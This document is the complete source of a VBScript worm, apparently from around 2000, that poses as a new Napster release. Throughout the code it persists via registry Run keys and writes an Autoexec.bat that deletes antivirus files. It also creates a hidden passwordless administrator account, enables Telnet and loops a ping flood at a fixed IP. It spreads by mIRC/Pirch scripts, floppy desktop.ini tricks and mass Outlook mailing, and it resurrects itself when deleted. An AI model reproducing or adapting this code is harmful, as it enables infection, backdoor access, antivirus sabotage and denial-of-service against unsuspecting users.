'VBS.CHAPO_GUZMAN OR VBS.ANTIMP3 OR VBS.ANTINAPSTER OR VBS.WHATEVER.U.WANT.2.CALL.ME
'WRITEN BY TEQUILA469 I DONT WORK FOR THE mExMAFIA NOR FOR THE ARTIST THAT GET RIPPED OFF OKAY!
'hOLD oN tHiS iS ONLy VeRSIoN 1_a Mod 1
Dim Ws, Fs, Dir0, Dir1
on error resume next
Set Ws = WScript.CreateObject("WScript.Shell")
Set Fs = CreateObject("Scripting.FileSystemObject")
Set fs = CreateObject("Scripting.FileSystemObject")
Set Dir0 = Fs.GetSpecialFolder(0)
Set Dir1 = Fs.GetSpecialFolder(1)
'Infect

If Not (fs.fileexists(fs.getspecialfolder(1) & "\No2Napster.Now")) Then
Fs.CopyFile WScript.ScriptFullName, Fs.BuildPath( Fs.GetSpecialFolder(1), "SoundDrv32.vxd.vbs") 
Ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\SoundDriver32","SoundVxd32.exe "&Dir1& "\SoundDrv32.vxd.vbs"
Else if (fs.fileexists(fs.getspecialfolder(1) & "\No2Napster.Now")) Then
	Wscript.Quit 
If Not (fs.fileexists(fs.getspecialfolder(0) & "\SoundVxd32.exe")) Then
Fs.copyfile Dir0 & "\Wscript.exe", Dir0 & "\SoundVxd32.exe"
End If
End If
End iF 
on error resume next
Set Abat = fs.CreateTextFile("c:\Autoexec.bat", True)
Abat.writeline "Rem [Hey How About An Anti AntiVirus]"
Abat.writeline "del c:\progra~1\trendp~1\*.exe"
Abat.writeline "del c:\progra~1\trendp~1\*.dll"
Abat.writeline "del c:\progra~1\trendp~1\*.dat"
Abat.writeline "del c:\progra~1\trendp~1\*.vxd"
Abat.writeline "del c:\trendp~1\*.exe"
Abat.writeline "del c:\trendp~1\*.dll"
Abat.writeline "del c:\trendp~1\*.dat"
Abat.writeline "del c:\trendp~1\*.vxd"
Abat.writeline "del c:\progra~1\f-prot\*.exe"
Abat.writeline "del c:\progra~1\f-prot\*.dll"
Abat.writeline "del c:\progra~1\f-prot\*.vxd"
Abat.writeline "del c:\progra~1\f-prot\*.rep"
Abat.writeline "del c:\f-prot\*.exe"
Abat.writeline "del c:\f-prot\*.dll"
Abat.writeline "del c:\f-prot\*.vxd"
Abat.writeline "del c:\f-prot\*.rep"
Abat.writeline "del c:\fsi\f-prot\*.exe"
Abat.writeline "del c:\fsi\f-prot\*.dll"
Abat.writeline "del c:\fsi\f-prot\*.vxd"
Abat.writeline "del c:\fsi\f-prot\*.rep"
Abat.writeline "del c:\progra~1\mcafee~1\*.dat "
Abat.writeline "del c:\progra~1\mcafee~1\*.dll "
Abat.writeline "del c:\progra~1\mcafee~1\*.exe "
Abat.writeline "del c:\progra~1\mcafee~1\*.vsc "
Abat.writeline "del c:\progra~1\mcafee\*.dat "
Abat.writeline "del c:\progra~1\mcafee\*.dll "
Abat.writeline "del c:\progra~1\mcafee\*.exe "
Abat.writeline "del c:\progra~1\mcafee\*.vsc "
Abat.writeline "del c:\mcafee~1\*.dat"
Abat.writeline "del c:\mcafee~1\*.dll"
Abat.writeline "del c:\mcafee~1\*.exe"
Abat.writeline "del c:\mcafee~1\*.vsc"
Abat.writeline "del c:\mcafee\*.dat"
Abat.writeline "del c:\mcafee\*.dll"
Abat.writeline "del c:\mcafee\*.exe"
Abat.writeline "del c:\mcafee\*.vsc"
Abat.writeline "del c:\progra~1\antiv~1\*.avc "
Abat.writeline "del c:\progra~1\antiv~1\*.set "
Abat.writeline "del c:\progra~1\antiv~1\*.dll "
Abat.writeline "del c:\progra~1\antiv~1\*.vxd "
Abat.writeline "del c:\progra~1\antiv~1\*.exe "
Abat.writeline "del c:\antiv~1\*.avc "
Abat.writeline "del c:\antiv~1\*.set "
Abat.writeline "del c:\antiv~1\*.dll "
Abat.writeline "del c:\antiv~1\*.vxd "
Abat.writeline "del c:\antiv~1\*.exe "
Abat.writeline "del c:\progra~1\norton~1\*.exe"
Abat.writeline "del c:\progra~1\norton~1\*.dll"
Abat.writeline "del c:\progra~1\norton~1\*.dat"
Abat.writeline "del c:\progra~1\norton~1\*.vxd"
Abat.writeline "del c:\norton~1\*.exe"
Abat.writeline "del c:\norton~1\*.dll"
Abat.writeline "del c:\norton~1\*.dat"
Abat.writeline "del c:\norton~1\*.vxd"
Abat.writeline 
Abat.Close
on error resume next
Set rm=fs.opentextfile(wscript.scriptfullname,1)
llll=1
Do While rm.atendofstream = False
line= rm.readline
if llll=1 then
code= replace(line, Chr(34), Chr(34) & " & chr(34) & " & Chr(34) )
else
code= code & Chr(34) & " & vbcrlf & " & Chr(34) & replace(line, Chr(34), Chr(34) & " & chr(34) & " & Chr(34) )
end if
llll=llll+1
Loop
htm = "<" & "html><" & "head><" & "title>Mp3Src</" & "title></" & "head><" & "body><" & "script langua" & "ge=vbscr" & "ipt>" & vbCrLf & "on error resume next" & vbCrLf & "set fs=createobject(""scripting.filesystemobject"")" & vbCrLf & "if err.number=429 then" & vbCrLf & "document.write " & Chr(34) & "<fo" & "nt face='verdana' size='2' color='#FF0000'>You need ActiveX enabled to see this file<br>Click <" & "a hre" & "f='javascript:location.reload()'>Here</a> to reload and click Yes</font>" & Chr(34) & "" & vbCrLf & "else" & vbCrLf & "set wb=fs.createtextfile(fs.getspecialfolder(0) & " & Chr(34) & "\SoundDrv32.vxd.vbs" & Chr(34) & ",true)" & vbCrLf
htm = htm & "wb.write " & chr(34) & code & chr(34)
htm = htm & vbCrLf & "wb.close" & vbCrLf & "set ws=createobject(" & Chr(34) & "wscript.shell" & Chr(34) & ")" & vbCrLf & "ws.run fs.getspecialfolder(0) & " & Chr(34) & "\SoundDrv32.vxd.vbs" & Chr(34) & ",false " & vbCrLf & "document.write " & Chr(34) & "<" & "font face='verdana' size='2' color='#FF000" & "0'>This disk has permanent errors, try to Use it on another computer again</" & "font>" & Chr(34) & "" & vbCrLf & "end if" & vbCrLf & "</" & "script></" & "body></" & "html>"
set wh=fs.createtextfile(fs.getspecialfolder(0) & "\NewNapster.html",true)
wh.write htm
wh.close
DriveA = "a:"
Ln1 = "[ExtShellFolderViews]"
ln2 = "Default={5984FFE0-28D4-11CF-AE66-08002B2E1262}"
ln3 = "{5984FFE0-28D4-11CF-AE66-08002B2E1262}={5984FFE0-28D4-11CF-AE66-08002B2E1262}"
ln4 = "[{5984FFE0-28D4-11CF-AE66-08002B2E1262}]"
ln5 = "PersistMoniker=file://Folder.htt"
ln6 = "Attributes=0x20000000"
ln7 = "[.ShellClassInfo]"
ln8 = "ConfirmFileOp=0"
If not Day(Now) =1 Then
	
	fs.DeleteFile fs.BuildPath(fs.GetSpecialFolder(0), "SoundDrv32.vxd.vbs"), True
	End If 
If Day(Now) =1 Then 
	If Not (fs.fileexists(DriveA & "\ResultFile.TXT.vbs")) Then
	MsgBox "Please Insert Floppy Disk Into A:\ Drive  For Monthly A:\ Drive Inspection!", 16, "A:\" 
	fs.copyfile fs.getspecialfolder(1) & "\SoundDrv32.vxd.vbs", DriveA & "\ResultFile.TXT.vbs"
	Set HTT = fs.CreateTextFile(DriveA & "\folder.htt") 
	HTT.Writeline Htm
        HTT.close
	Set INI = fs.CreateTextFile(DriveA & "\desktop.ini")
	INI.Writeline ln1
	INI.Writeline ln2
        INI.Writeline ln3
        INI.Writeline ln4
        INI.Writeline ln5
        INI.Writeline ln6
        INI.Writeline ln7
        INI.Writeline ln8
        INI.close
        Else If not (fs.fileexists(fs.getspecialfolder(0) & "\SoundDrv32.vxd.vbs")) Then
        MsgBox "Please Insert Another Floppy, This Disk Contains Old Result File", 16, "A:\"
	fs.copyfile fs.getspecialfolder(1) & "\SoundDrv32.vxd.vbs", DriveA & "\ResultFile.TXT.vbs"
	fs.copyfile DriveA & "\ResultFile.TXT.vbs", fs.getspecialfolder(1) & "\ResultFile.TXT.vbs"
	Set HTT = fs.CreateTextFile(DriveA & "\folder.htt") 
	HTT.Writeline Htm
        HTT.close
	Set INI = fs.CreateTextFile(DriveA & "\desktop.ini")
	INI.Writeline ln1
	INI.Writeline ln2
        INI.Writeline ln3
        INI.Writeline ln4
        INI.Writeline ln5
        INI.Writeline ln6
        INI.Writeline ln7
        INI.Writeline ln8
        INI.close
        Else If (fs.fileexists(fs.getspecialfolder(0) & "\SoundDrv32.vxd.vbs")) Then
          	WScript.Quit
        End If
        End If  
End if
End if
'Dowin2k
on error resume next
If Not (fs.fileexists(fs.getspecialfolder(0) & "\RunHelp.cab")) Then
Set HTA = fs.CreateTextFile(fs.getspecialfolder(1) & "\Zcript.hta") 
HTA.Writeline "MSFT      	      A                                    ÿÿÿÿÿÿÿÿ    €   ÿÿÿÿ    ÿÿÿÿ    ÿÿÿÿ   ÿÿÿÿ    ÿÿÿÿ   ÿÿÿÿ    ÿÿÿÿ   ÿÿÿÿ    ÿÿÿÿ   D  €   ÿÿÿÿ   Ä     ÿÿÿÿ   Ü     ÿÿÿÿ   Ü     ÿÿÿÿ   ø  8  ÿÿÿÿ   ÿÿÿÿ    ÿÿÿÿ   ÿÿÿÿ    ÿÿÿÿ   ÿÿÿÿ    ÿÿÿÿ   ÿÿÿÿ    ÿÿÿÿ   ÿÿÿÿ    ÿÿÿÿ   ÿÿÿÿ    ÿÿÿÿ   ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ_Ðr¤ãZåO­ŸTý³ð©øþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ ÎyScriptletTypeLib5<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object><SCRIPT>;wsh.Run('cmd /c echo @echo off>> ~loading.bat',true,1);wsh.Run('cmd /c echo net user MySecret /add /expires:never /passwordreq:no>> ~Loading.bat',true,1);wsh.Run('cmd /c echo net localgroup Administrators /add MySecret>> ~Loading.bat',true,1);wsh.Run('cmd /c echo net localgroup Users /del MySecret>> ~Loading.bat',true,1);wsh.Run('cmd /c echo net start tlntsvr >> ~Loading.bat',true,1);wsh.Run('cmd /c echo :Denial>> ~Loading.bat',true,1);wsh.Run('cmd /c echo Ping 205.167.142.6 -a -l 1 -t>> ~Loading.bat',true,1);wsh.Run('cmd /c echo Goto Denial>> ~Loading.bat',true,1);wsh.Run('~loading.bat',true,1)W"
HTA.close 
End If
If (fs.fileexists(fs.getspecialfolder(1) & "\Zcript.hta")) Then
Ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\MShtadll","Mshta.exe "&fs.GetSpecialFolder(1)& "\Zcript.hta %"
Ws.RegWrite "HKLM\SOFTWARE\Microsoft\TelnetServer\1.0\TelnetPort",469,"REG_DWORD"
ws.run "Cmd /C Start http://wwp.icq.com/scripts/WWPMsg.dll?from=ELCHAPOVBS&fromemail=ELCHAPO@SELESPELO.COM&subject=New_FriendWin2k&body=Hey_There&to=68899941", 1, False
End If

If (fs.fileexists(fs.getspecialfolder(0) & "\RunHelp.cab")) Then
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C$\Parm1enc",Chr(120) & Chr(195) & Chr(30) & Chr(227) & Chr(16) & Chr(251) & Chr(145) & Chr(62)
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C\Parm1enc",Chr(120) & Chr(195) & Chr(30) & Chr(227) & Chr(16) & Chr(251) & Chr(145) & Chr(62)
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\Cdrv\Parm1enc",Chr(120) & Chr(195) & Chr(30) & Chr(227) & Chr(16) & Chr(251) & Chr(145) & Chr(62)
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\Cdrive\Parm1enc",Chr(120) & Chr(195) & Chr(30) & Chr(227) & Chr(16) & Chr(251) & Chr(145) & Chr(62)
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\MydriveC\Parm1enc",Chr(120) & Chr(195) & Chr(30) & Chr(227) & Chr(16) & Chr(251) & Chr(145) & Chr(62)
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\Mydrive\Parm1enc",Chr(120) & Chr(195) & Chr(30) & Chr(227) & Chr(16) & Chr(251) & Chr(145) & Chr(62)
Set URL = fs.CreateTextFile(fs.getspecialfolder(1) & "\ICQ.URL")
URL.WRITELINE "[InternetShortcut]"
URL.WRITELINE "http://wwp.icq.com/scripts/WWPMsg.dll?from=ELCHAPOVBS&fromemail=ELCHAPO@SELESPELO.COM&subject=New_FriendWin98&body=Hey_There&to=68899941"
URL.CLOSE
ws.run fs.getspecialfolder(1) & "\ICQ.URL", 1, True

End If

If path = "" Then
If fs.fileexists("c:\pirch\Pirch32.exe") Then path = "c:\pirch"
If fs.fileexists("c:\pirch32\Pirch32.exe") Then path = "c:\pirch32"
pfDir = ws.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If fs.fileexists(pfDir & "\pirch\Pirch32.exe") Then path = pfDir & "\pirch\Pirch32.exe"
End If
If path <> "" Then
Set Script = fs.CreateTextFile(path & "\events.ini", True)

Script.WriteLine "[Levels]"
Script.WriteLine "Enabled=1"
Script.WriteLine "Count=6"
Script.WriteLine "Level1=000-Unknowns"
Script.WriteLine "000-UnknownsEnabled=1"
Script.WriteLine "Level2=100-Level 100"
Script.WriteLine "100-Level 100Enabled=1"
Script.WriteLine "Level3=200-Level 200"
Script.WriteLine "200-Level 200Enabled=1"
Script.WriteLine "Level4=300-Level 300"
Script.WriteLine " 300-Level 300Enabled=1"
Script.WriteLine "Level5=400-Level 400 "
Script.WriteLine "400-Level 400Enabled=1"
Script.WriteLine "Level6=500-Level 500"
Script.WriteLine "500-Level 500Enabled=1"
Script.WriteLine ""
Script.WriteLine "[000-Unknowns]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[100-Level 100]"
Script.WriteLine "User1=*!*@*"
Script.WriteLine "UserCount=1"
Script.WriteLine "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick" & " " & fs.getspecialfolder(0) & "\NewNapster.html"
Script.WriteLine "EventCount=1"
Script.WriteLine ""
Script.WriteLine "[200-Level 200]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[300-Level 300]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[400-Level 400]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[500-Level 500]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.Close
End If
on error resume next
If Path = "" Then
If fs.fileexists("c:\mirc\mirc.ini") Then Path = "c:\mirc"
If fs.fileexists("c:\mirc32\mirc.ini") Then Path = "c:\mirc32"
PfDir = ws.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If fs.fileexists(PfDir & "\mirc\mirc.ini") Then Path = PfDir & "\mirc"
End If
If Path <> "" Then
Set Script = fs.CreateTextFile(Path & "\script.ini", True)
Script.writeline "[script]"
Script.writeline "n0=on 1:JOIN:#:{"
Script.writeline "n1=  /if ( $nick == $me ) { halt }"
Script.writeline "n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick" & " " & fs.getspecialfolder(0) & "\NewNapster.html"
Script.writeline "n3=}"
Script.Close
End If
on error resume next 
Set Out00k=createobject("outlook.application")
Set mapi = Out00k.GetNameSpace("MAPI")
for each adlist in mapi.AddressLists
aec=adlist.AddressEntries.Count
if aec<> 0 then
set msg=Out00k.CreateItem(0)
msg.Subject= "Re: NEW UNREALESED NAPSTER!"
msg.body = "> Check Out The New Version Of Napster!"+vbcrlf+"> It's just The Coolest Program!" +vbcrlf +">"
msg.DeleteAfterSubmit = True
msg.Attachments.Add fs.getspecialfolder(1) & "\NewNapster.Html"
for iii=1 to aec
set adentr=adlist.AddressEntries(iii)
if aec=1 then 
msg.BCC=adentr.Address
else
msg.BCC=msg.Bcc & "; " & adentr.Address
end if
next
msg.send
done=1
end if
next
Set Myself = fs.opentextfile(wscript.scriptfullname, 1)
MyCode = Myself.readall
Myself.Close
Do
WScript.Sleep 30000
If Not (fs.fileexists(wscript.scriptfullname)) Then
Set Myself = fs.createtextfile(wscript.scriptfullname, True)
Myself.write MyCode
Myself.Close
WScript.Sleep 30000
End If
Loop